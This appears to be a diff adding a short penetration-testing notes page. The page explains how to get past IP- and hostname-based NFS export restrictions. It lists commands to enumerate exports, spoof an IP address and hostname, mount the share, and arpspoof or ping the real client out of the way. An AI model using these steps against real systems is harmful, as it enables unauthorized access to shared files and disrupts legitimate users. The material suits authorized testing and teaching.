@@ -1,0 +1,19 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Spoof For Access</title>
+</head><body>If you showmount -e &lt;ip&gt; you can see exports and what users are allowed to access those exports<br/>
+These are typically filtered based on IP address and sometimes on hostname<br/>
+<br/>
+You can exploit this configuration by spoofing your ip address / hostname and then attempting to connect<br/>
+<br/>
+ifconfig &lt;interface&gt; &lt;spoof_IP&gt;<br/>
+echo &lt;hostname&gt; &gt; /etc/hostname<br/>
+&nbsp;&#09;#If changing hostname, make sure to reboot your machine<br/>
+<br/>
+Now try to mount the nfs export<br/>
+mount -o nolock,&lt;options&gt; IP:/export/path /mnt/&lt;path&gt;<br/>
+<br/>
+You may want to try to ping the target continually or arpspoof the target machine in order to successfully mount the export<br/>
+This is because the actual client may be online and actively using the share (or just the IP is in use). </body></html>
